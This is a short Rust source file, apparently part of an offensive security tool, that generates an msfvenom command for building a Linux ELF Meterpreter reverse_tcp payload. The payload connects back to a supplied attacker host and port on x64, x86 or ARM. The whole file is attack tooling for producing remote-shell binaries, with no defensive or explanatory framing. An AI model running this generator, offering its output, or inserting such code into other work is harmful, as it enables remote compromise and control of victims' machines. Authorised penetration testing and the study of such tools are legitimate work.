// Linux ELF payload generator
use crate::cli::banner;

pub struct ElfGenerator;

impl ElfGenerator {
    pub fn new() -> Self { Self }
    
    pub fn generate(&self, lhost: &str, lport: &str, arch: &str) -> String {
        banner::print_exploiting("ELF-PAYLOAD", &format!("{}:{}", lhost, lport));
        
        let payload_type = match arch {
            "x64" => "linux/x64/meterpreter/reverse_tcp",
            "x86" => "linux/x86/meterpreter/reverse_tcp",
            "arm" => "linux/armle/meterpreter/reverse_tcp",
            _ => "linux/x64/meterpreter/reverse_tcp",
        };
        
        format!(
            "msfvenom -p {} LHOST={} LPORT={} -f elf -o payload.elf",
            payload_type, lhost, lport
        )
    }
}
